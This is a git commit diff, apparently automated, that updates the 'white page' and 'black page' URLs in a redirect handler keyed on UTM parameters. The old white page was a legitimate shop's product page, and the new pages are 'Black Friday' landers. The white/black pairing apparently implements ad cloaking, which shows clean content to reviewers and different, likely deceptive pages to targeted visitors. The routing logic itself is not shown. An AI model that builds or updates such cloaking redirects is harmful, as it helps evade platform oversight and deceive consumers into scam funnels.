2f28e374e2fa7a67cc611d672bdc92ba63b0cb88
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-21 07:50:49 +0500

    chore: Update lander links (automated)
    White Hat: https://zeleblackfridywh.lovable.app/?
    Black Hat: https://zeleblackfridybh.lovable.app/?
    
    Request ID: RLMVgb4HVv73lyojGfoa
    Allocated to: test@driftmeta.com
    Auto-release: 2025-11-22T02:50:48.971Z

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://powerhouseexpress.com.pk/products/acefast-pd-65w-wall-charger-black";
-    const blackPageURL = "https://casssshlov.lovable.app/?";
+    const whitePageURL = "https://zeleblackfridywh.lovable.app/?";
+    const blackPageURL = "https://zeleblackfridybh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
